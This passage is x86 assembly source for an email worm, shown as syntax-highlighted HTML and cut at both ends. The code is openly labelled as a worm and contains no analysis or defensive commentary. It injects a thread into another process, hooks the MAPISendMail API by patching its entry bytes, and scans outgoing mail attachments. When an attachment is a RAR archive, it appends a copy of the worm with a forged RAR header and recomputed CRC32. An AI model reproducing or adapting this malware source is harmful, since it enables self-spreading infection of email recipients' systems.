    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateRemoteThread</span><span class="sc0">          </span><span class="sc1">;create thread there</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_proc_infect3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WaitForSingleObject</span><span class="sc0">         </span><span class="sc1">;wait for its termination</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc1">;and close its handle</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_proc_infect2</span><span class="sc0">            </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">end_proc_infect3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualFreeEx</span><span class="sc0">               </span><span class="sc1">;release memory if failed</span><span class="sc0">

</span><span class="sc5">end_proc_infect2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc1">;close handle to process</span><span class="sc0">
</span><span class="sc5">end_proc_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">proc_infect</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc1">;remote thread procedure</span><span class="sc0">
</span><span class="sc5">ThreadEntry</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gdelta</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;get delta offset</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'MAPI32.dll'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_gmha</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get address of MAPI32.dll</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_seh</span><span class="sc0">                 </span><span class="sc1">;quit if not loaded</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'MAPISendMail'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_gpa</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get address of</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;MAPISendMail API</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_seh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;to ESI</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_vp</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;release page protection</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_seh</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hook_api</span><span class="sc0">                </span><span class="sc1">;hook the API</span><span class="sc0">

</span><span class="sc5">end_seh</span><span class="sc4">:</span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;and quit</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;proc for API hooking</span><span class="sc0">
</span><span class="sc5">hook_api</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_MAPI_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_MAPI_api</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;save first bytez of API</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAPI_hooker</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;overwrite by JMP &lt;worm_api&gt;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;the API hooker</span><span class="sc0">
</span><span class="sc5">MAPI_hooker</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">old_MAPI_addr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;save the address of API</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.cPushad</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get ptr to message</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;number of attachmentz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;ptr to file fieldz</span><span class="sc0">

</span><span class="sc5">f_parse</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">arc_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">@copysz</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">over_slash</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">over_slash</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@copysz</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">20202020h</span><span class="sc0">           </span><span class="sc1">;lower case</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'rar.'</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;create path+filename</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">o_r</span><span class="sc0">                 </span><span class="sc1">;quit if not RAR file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_archive</span><span class="sc0">              </span><span class="sc1">;try to infect this file</span><span class="sc0">
</span><span class="sc5">o_r</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">f_parse</span><span class="sc0">                 </span><span class="sc1">;try another file in msg</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@m_res</span><span class="sc0">
    </span><span class="sc5">old_MAPI_api</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@m_res</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;remove the API hooker</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">


</span><span class="sc1">;procedure for RAR archive infecting</span><span class="sc0">
</span><span class="sc5">infect_archive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gd</span><span class="sc0">
</span><span class="sc5">gd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;get delta offset</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">worm_name</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get worm filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_cfa</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;open worm file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;save handle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_gfs</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get its size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_va</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;allocate enough memory</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_rf</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                 </span><span class="sc1">;and copy there worm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">;close handle to file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                   </span><span class="sc1">;calculate CRC32 of</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARCRC32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;the worm file</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_cfa</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;open the archive</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_file2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;save its handle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_sfp</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;go to EOF</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARHeader</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                   </span><span class="sc1">;calculate CRC32 of</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;the RAR file header</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;and save it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARHeader</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">end_RAR</span><span class="sc0">
</span><span class="sc5">RARHeader</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;No comment ;)</span><span class="sc0">
